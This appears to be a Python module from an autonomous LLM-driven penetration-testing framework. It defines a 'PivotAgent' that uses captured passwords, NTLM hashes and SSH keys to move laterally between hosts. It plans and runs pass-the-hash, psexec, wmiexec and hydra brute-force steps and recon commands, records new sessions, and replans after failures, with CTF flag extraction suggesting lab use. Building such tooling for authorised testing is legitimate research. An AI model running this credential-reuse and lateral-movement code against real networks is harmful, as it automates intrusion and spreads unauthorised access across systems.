"""PivotAgent — lateral movement between hosts using captured credentials/sessions.

Reference: Cochise executor.py — SSH command execution + credential reuse
           AD_pt paper — Pass-the-Hash, Pass-the-Ticket techniques
"""

from __future__ import annotations

import json
import re
from typing import Any, Dict, List

from darwin.dkg import DKG
from darwin.sub_agents.base import (
    AgentType, BaseSubAgent, SubAgentResult, TaskScope, TokenBudget,
)
from darwin.tools.attack_server import create_attack_gateway
from darwin.utils.llm import LLMSession


class PivotAgent(BaseSubAgent):
    """Lateral movement agent.

    Uses captured credentials to move between hosts, expanding the attack surface.
    All decision-making (credential selection, host targeting, result evaluation,
    replanning) is LLM-driven.

    Reference: Cochise executor.py — credential-based movement patterns
    """

    def __init__(
        self,
        agent_id: str,
        task_scope: TaskScope,
        dkg: DKG,
        llm_session: LLMSession | None = None,
        budget: TokenBudget | None = None,
    ):
        tools = create_attack_gateway()
        super().__init__(
            agent_id=agent_id,
            agent_type=AgentType.PIVOT,
            task_scope=task_scope,
            dkg=dkg,
            llm_session=llm_session or LLMSession(),
            budget=budget or TokenBudget(max_tokens=32000, max_iterations=20),
            tools=tools,
        )

    async def _generate_plan(self) -> List[Dict[str, Any]]:
        """Generate lateral movement plan — LLM-driven with PivotAgent system prompt."""
        credentials = self.dkg.query_nodes("Credential")
        sessions = self.dkg.query_nodes("Session")
        hosts = self.dkg.query_nodes("Host")

        if not credentials:
            return []

        # Build context for LLM
        cred_text = "\n".join(
            f"- {c.get('user','?')}@{c.get('source_host','?')} "
            f"(pass: {bool(c.get('password'))}, hash: {bool(c.get('hash'))}, key: {bool(c.get('ssh_key_path'))})"
            for c in credentials[:5]
        )
        host_text = "\n".join(f"- {h.get('id','?')} (reachable: {h.get('is_reachable',True)})"
                              for h in hosts[:10])
        session_text = "\n".join(f"- {s.get('host','?')} as {s.get('user','?')}"
                                 for s in sessions[:5])

        from darwin.prompts.pivot_agent import SYSTEM_PROMPT_PIVOT

        # Include AD/Windows lateral movement tools alongside SSH
        pivot_tools = sorted(set(
            self.tools.get_tool_names()
        ).intersection({
            "test_credential", "ssh_exec", "ssh_key_exec",
            "impacket_pth", "impacket_psexec", "impacket_wmiexec",
            "netexec_enum", "hydra_ssh_brute",
        }))

        prompt = f"""Credentials available:
{cred_text}

Hosts discovered:
{host_text}

Active sessions:
{session_text or '(none)'}

Create a lateral movement plan with 2-5 steps. Test credentials on unreached hosts.
For SSH credentials, use test_credential/ssh_exec/ssh_key_exec.
For NTLM hashes or Windows targets, use impacket_pth/impacket_psexec/impacket_wmiexec.
Output as JSON array:
[{{"id": "pivot-1", "instruction": "...", "tool": "test_credential", "params": {{...}}, "dependent_task_ids": []}}]"""

        self._maybe_compress()
        content, _ = self.llm.generate(
            prompt=prompt,
            system_prompt=SYSTEM_PROMPT_PIVOT.format(
                credentials=cred_text,
                hosts=host_text,
                sessions=session_text or "(none)",
                tools=", ".join(pivot_tools),
            ),
        )
        try:
            match = re.search(r'\[.*\]', content, re.DOTALL)
            if match:
                llm_plan = json.loads(match.group(0))
                if isinstance(llm_plan, list) and len(llm_plan) > 0:
                    return llm_plan
        except Exception:
            pass

        # Fallback: hardcoded plan
        plan = []
        sessioned_hosts = {s.get("host", "") for s in sessions}
        for i, cred in enumerate(credentials):
            target_hosts = [h["id"] for h in hosts
                           if h["id"] not in sessioned_hosts and h["id"] != cred.get("source_host","")]
            cred_type = cred.get("cred_type", "") or ""
            has_hash = bool(cred.get("hash") or cred.get("ntlm_hash"))
            for target in target_hosts[:3]:
                cred_user = cred.get("user", cred.get("username", ""))
                cred_pass = cred.get("password", "")
                # Choose tool based on credential type
                if has_hash and ("ntlm" in cred_type.lower() or "ad" in cred_type.lower()):
                    tool = "impacket_pth"
                    params = {
                        "target": target, "username": cred_user,
                        "ntlm_hash": cred.get("hash", cred.get("ntlm_hash", "")),
                        "command": "whoami && ipconfig /all",
                    }
                elif "ssh" in cred_type.lower() or not cred_type:
                    tool = "test_credential" if cred_pass else "ssh_exec"
                    params = {
                        "user": cred_user,
                        "host": target,
                        "password": cred_pass,
                        "command": "id; hostname; ifconfig 2>/dev/null || ip addr 2>/dev/null",
                    }
                else:
                    # DB credentials or generic — try test_credential
                    tool = "test_credential"
                    params = {
                        "user": cred_user,
                        "host": target,
                        "password": cred_pass,
                        "command": "whoami",
                    }
                plan.append({
                    "id": f"pivot-{i}-{target}",
                    "instruction": f"Test credential {cred_user} on {target}",
                    "action": "credential_test",
                    "tool": tool,
                    "params": params,
                    "credential_id": cred.get("id", ""),
                    "dependent_task_ids": [],
                })

        for session in sessions:
            session_host = session.get("host", "")
            if session.get("access_level") in ("root", "admin", "system"):
                plan.append({
                    "id": f"pivot-probe-{session_host}",
                    "instruction": f"Probe for internal hosts reachable from {session_host}",
                    "action": "internal_probe",
                    "tool": "ssh_exec",
                    "params": {
                        "user": session.get("user", "root"),
                        "host": session_host,
                        "command": "ip route; arp -a 2>/dev/null; cat /etc/hosts 2>/dev/null",
                    },
                    "dependent_task_ids": [],
                })

        return plan

    async def _execute_task(self, task: Dict[str, Any]) -> Any:
        """Execute a lateral movement task — LLM decides which credential to use
        on which host with which tool.

        The LLM receives the DKG state (credentials, hosts, sessions) and available
        pivot tool definitions to make the best lateral movement decision.
        """
        tool_defs = self.tools.get_tool_definitions()
        tool_names = self.tools.get_tool_names()

        # Gather current DKG context
        credentials = self.dkg.query_nodes("Credential")
        hosts = self.dkg.query_nodes("Host")
        sessions = self.dkg.query_nodes("Session")
        sessioned_hosts = {s.get("host", "") for s in sessions}

        unreached = [h.get("id", "") for h in hosts
                     if h.get("id", "") not in sessioned_hosts]

        ctx = (
            f"Credentials: {len(credentials)}, "
            f"Unreached hosts: {len(unreached)}, "
            f"Active sessions: {len(sessions)}"
        )

        prompt = (
            f"Task: {task['instruction']}\n"
            f"DKG Context: {ctx}\n"
            f"Unreached hosts: {', '.join(unreached[:5]) if unreached else '(all reached)'}\n"
            f"Available tools: {', '.join(sorted(tool_names))}\n\n"
            f"Choose the best lateral movement tool and parameters. "
            f"Prioritize testing credentials on unreached hosts. "
            f"If a credential has a password, use test_credential. "
            f"If a credential has an SSH key path, use ssh_key_exec."
        )

        from darwin.prompts.pivot_agent import SYSTEM_PROMPT_PIVOT

        self._maybe_compress()
        content, tool_calls = self.llm.generate(
            prompt=prompt,
            system_prompt=SYSTEM_PROMPT_PIVOT.format(
                credentials=str([c.get("user", "") for c in credentials[:5]]),
                hosts=str(unreached[:5]),
                sessions=str(list(sessioned_hosts)[:5]),
                tools=", ".join(tool_names),
            ),
            tools=tool_defs,
        )

        if tool_calls:
            call = tool_calls[0]
            tool_name = call.get("name", "test_credential")
            params = call.get("arguments", {})
        else:
            # Fallback: use the task's specified tool
            tool_name = task.get("tool", "test_credential")
            params = task.get("params", {})

        result = await self.tools.call(tool_name, params)
        self.budget.tokens_used += 800
        task["_tool_used"] = tool_name
        task["_params_used"] = params
        return result

    async def _evaluate_result(
        self, task: Dict[str, Any], result: Any
    ) -> tuple[bool, List[Dict[str, Any]]]:
        """Evaluate pivot result — LLM-driven analysis for session establishment
        and internal network discovery.

        Falls back to regex for flags and basic shell/protocol indicators.
        """
        findings = []

        if result is None or not hasattr(result, "success"):
            return False, findings

        stdout = getattr(result, "stdout", "")
        tool_name = task.get("_tool_used", task.get("tool", ""))
        params = task.get("params", {})
        host = params.get("host", "")
        user = params.get("user", "")

        # Always extract flags via regex (most reliable signal)
        flags = re.findall(r"flag\{[a-zA-Z0-9_\-!@#$%^&*()+=]+\}", stdout, re.IGNORECASE)
        for flag in flags:
            findings.append({"type": "flag", "value": flag, "source": "pivot_stdout"})

        if flags:
            self.findings.extend(findings)
            return True, findings

        # LLM-driven evaluation
        from darwin.prompts.pivot_agent import SYSTEM_PROMPT_PIVOT_EVALUATE
        try:
            eval_prompt = SYSTEM_PROMPT_PIVOT_EVALUATE.format(
                tool_name=tool_name,
                target_host=host,
                tool_output=stdout[:3000],
            )
            self._maybe_compress()
            content, _ = self.llm.generate(
                prompt=eval_prompt,
                system_prompt="You are a lateral movement result evaluator. Output ONLY valid JSON.",
            )
            match = re.search(r'\{[^{}]*\}', content, re.DOTALL)
            if match:
                eval_result = json.loads(match.group(0))
                if isinstance(eval_result, dict):
                    for f in eval_result.get("findings", []):
                        if isinstance(f, dict):
                            findings.append(f)
                    # Process new sessions found by LLM
                    if eval_result.get("new_session_established"):
                        findings.append({
                            "type": "new_session",
                            "host": host,
                            "user": user,
                            "access_level": eval_result.get("access_level", "user"),
                            "evidence": stdout[:200],
                            "source": "pivot",
                        })
                    # Process internal hosts discovered
                    for ip in eval_result.get("internal_hosts_found", []):
                        findings.append({
                            "type": "new_internal_host",
                            "host": ip,
                            "evidence": f"Discovered via session on {host}",
                            "source": "pivot",
                        })
        except Exception:
            pass

        # Fallback: basic regex-based checks if LLM produced nothing
        if not findings:
            ssh_indicators = ["uid=", "gid=", "Linux", "$ ", "# "]
            win_indicators = ["Windows", "Microsoft", "C:\\", "Administrator",
                            "NT AUTHORITY", "cmd.exe", "\\>"]
            got_shell = any(ind in stdout for ind in ssh_indicators + win_indicators)
            if got_shell:
                is_windows = any(ind in stdout for ind in win_indicators)
                findings.append({
                    "type": "new_session",
                    "host": host,
                    "user": user,
                    "access_level": "user",
                    "evidence": stdout[:200],
                    "source": "pivot",
                })
                # Mark host as reachable
                self.dkg.update_node(host, {"is_reachable": True})
                # Record session in DKG
                self.dkg.add_node("Session", f"session-{host}-{user}", {
                    "host": host, "user": user,
                    "access_level": "shell",
                    "shell_type": "cmd" if is_windows else "ssh",
                    "established_by": self.agent_id,
                })

            # Check for internal network discovery via regex
            if "inet " in stdout or "addr:" in stdout:
                ips = re.findall(r"(?:inet\s+|addr:)(\d+\.\d+\.\d+\.\d+)", stdout)
                for ip in ips:
                    if ip not in ("127.0.0.1", "0.0.0.0"):
                        findings.append({
                            "type": "new_internal_host",
                            "host": ip,
                            "evidence": f"Discovered via session on {host}",
                            "source": "pivot",
                        })
                        self.dkg.add_node("Host", ip, {
                            "ip": ip,
                            "is_reachable": False,
                            "is_internal": True,
                            "discovered_by": self.agent_id,
                            "reachable_via": host,
                        })

        # Write DKG updates for new sessions discovered by LLM
        for f in findings:
            if f.get("type") == "new_session":
                f_host = f.get("host", host)
                f_user = f.get("user", user)
                if f_host:
                    self.dkg.update_node(f_host, {"is_reachable": True})
                    self.dkg.add_node("Session", f"session-{f_host}-{f_user}", {
                        "host": f_host, "user": f_user,
                        "access_level": f.get("access_level", "shell"),
                        "shell_type": "ssh",
                        "established_by": self.agent_id,
                    })
            elif f.get("type") == "new_internal_host":
                f_ip = f.get("host", "")
                if f_ip:
                    self.dkg.add_node("Host", f_ip, {
                        "ip": f_ip,
                        "is_reachable": False,
                        "is_internal": True,
                        "discovered_by": self.agent_id,
                        "reachable_via": host,
                    })

        self.findings.extend(findings)
        return len(findings) > 0, findings

    async def _replan_after_failure(
        self, failed_task: Dict[str, Any], result: Any
    ) -> List[Dict[str, Any]]:
        """LLM-driven replanning after a failed lateral movement attempt.

        Analyzes failure and proposes alternative credentials, hosts, or tools.
        """
        stdout = getattr(result, "stdout", "") if hasattr(result, "stdout") else ""
        tool_name = failed_task.get("_tool_used", failed_task.get("tool", ""))

        # Gather current DKG state for context
        credentials = self.dkg.query_nodes("Credential")
        sessions = self.dkg.query_nodes("Session")
        hosts = self.dkg.query_nodes("Host")
        sessioned_hosts = {s.get("host", "") for s in sessions}
        unreached = [h.get("id", "") for h in hosts
                     if h.get("id", "") not in sessioned_hosts]

        from darwin.prompts.pivot_agent import SYSTEM_PROMPT_PIVOT_REPLAN

        try:
            replan_prompt = SYSTEM_PROMPT_PIVOT_REPLAN.format(
                task_instruction=failed_task.get("instruction", ""),
                tool_name=tool_name,
                result_summary=stdout[:1500],
                credentials=str([c.get("user", "") for c in credentials[:5]]),
                unreached_hosts=str(unreached[:5]),
            )
            self._maybe_compress()
            content, _ = self.llm.generate(
                prompt=replan_prompt,
                system_prompt="You are a lateral movement strategist. Output ONLY valid JSON array.",
            )
            match = re.search(r'\[.*\]', content, re.DOTALL)
            if match:
                new_tasks = json.loads(match.group(0))
                if isinstance(new_tasks, list) and new_tasks:
                    self.plan = [t for t in self.plan if t.get("id") != failed_task.get("id")]
                    self.plan.extend(new_tasks)
                    return self.plan
        except Exception:
            pass

        self._mark_task_done(failed_task)
        return self.plan

    async def _update_plan(
        self, completed_task: Dict[str, Any], result: Any
    ) -> List[Dict[str, Any]]:
        """LLM-driven plan update after a successful lateral movement.

        Analyzes new sessions/hosts and decides whether to add follow-up pivot tasks.
        """
        stdout = getattr(result, "stdout", "") if hasattr(result, "stdout") else ""

        self._mark_task_done(completed_task)

        remaining = [t for t in self.plan if not t.get("done", False)]
        if not remaining:
            return self.plan

        try:
            self._maybe_compress()
            content, _ = self.llm.generate(
                prompt=(
                    f"Lateral movement task COMPLETED: '{completed_task['instruction']}'\n"
                    f"Output: {stdout[:1200]}\n"
                    f"Remaining plan: {json.dumps(remaining[:3], indent=2)}\n\n"
                    f"Based on what we learned, should we add follow-up pivot tasks? "
                    f"Output a JSON array of additional tasks, or [] if none needed."
                ),
                system_prompt="You are a lateral movement strategist. Output ONLY valid JSON array.",
            )
            match = re.search(r'\[.*\]', content, re.DOTALL)
            if match:
                new_tasks = json.loads(match.group(0))
                if isinstance(new_tasks, list) and new_tasks:
                    self.plan.extend(new_tasks)
        except Exception:
            pass

        return self.plan

    def _write_findings_to_dkg(
        self, task: Dict[str, Any], result: Any, findings: List[Dict[str, Any]]
    ) -> None:
        """Pivot findings are written directly during _evaluate_result."""
        pass  # Already written in _evaluate_result for real-time DKG updates
